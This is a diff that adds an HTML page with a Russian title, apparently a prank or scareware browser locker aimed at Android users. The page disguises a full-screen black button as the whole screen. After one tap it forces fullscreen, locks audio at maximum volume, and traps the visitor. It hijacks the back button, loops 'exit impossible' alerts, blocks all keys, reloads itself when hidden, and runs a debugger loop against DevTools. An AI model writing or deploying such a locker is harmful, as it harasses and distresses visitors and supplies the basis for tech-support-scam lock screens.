@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Плаки плаки</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body, html { width: 100%; height: 100%; background: black; display: flex; justify-content: center; align-items: center; }
+        #start { position: absolute; width: 100%; height: 100%; background: black; border: none; }
+    </style>
+</head>
+<body>
+    <button id="start"></button>
+    <audio id="audio" loop>
+        <source id="audioSource" type="audio/mpeg">
+        Ваш браузер не поддерживает аудио.
+    </audio>
+
+    <script>
+        const button = document.getElementById("start");
+        const audio = document.getElementById("audio");
+        const audioSource = document.getElementById("audioSource");
+        const isAndroid = /Android/i.test(navigator.userAgent);
+
+        // Массив с песнями
+        const songs = ['audio1.mp3', 'audio2.mp3', 'audio3.mp3'];
+        
+        // Генерация случайного индекса для выбора песни
+        const randomIndex = Math.floor(Math.random() * songs.length);
+        
+        // Устанавливаем случайную песню
+        audioSource.src = songs[randomIndex];
+
+        if (isAndroid) {
+            button.addEventListener("click", async () => {
+                await forceFullScreen();
+                forceVolume();
+                audio.play();
+                button.remove();
+                blockExit();
+            });
+
+            // Принудительный полноэкранный режим
+            function forceFullScreen() {
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen().catch(console.error);
+                }
+            }
+
+            // Принудительная громкость на максимум
+            function forceVolume() {
+                audio.volume = 1.0;  // Максимальная громкость
+                Object.defineProperty(audio, 'volume', {
+                    get: () => 1.0,
+                    set: () => {}
+                });
+            }
+
+            // Блокировка выхода (кнопка "Назад" возвращает на сайт)
+            function blockExit() {
+                window.history.pushState(null, "", window.location.href);
+                window.addEventListener("popstate", function() {
+                    window.history.pushState(null, "", window.location.href);
+                    alert("Выход невозможен!");
+                    setTimeout(() => {
+                        location.href = window.location.href;
+                    }, 100);
+                });
+            }
+
+            // Бесконечный alert() при сворачивании браузера
+            document.addEventListener("visibilitychange", () => {
+                if (document.hidden) {
+                    setInterval(() => alert("Выход невозможен!"), 100);
+                }
+            });
+
+            // Блокировка горячих клавиш
+            document.addEventListener("keydown", (e) => {
+                e.preventDefault();
+            });
+
+            // Если сайт закрылся, перезапуск
+            setInterval(() => {
+                if (document.visibilityState === "hidden") {
+                    location.href = window.location.href;
+                }
+            }, 500);
+
+            // DevTools защита (автоматически закрывает их)
+            setInterval(() => { debugger; }, 100);
+        }
+
+    </script>
+</body>
+</html>
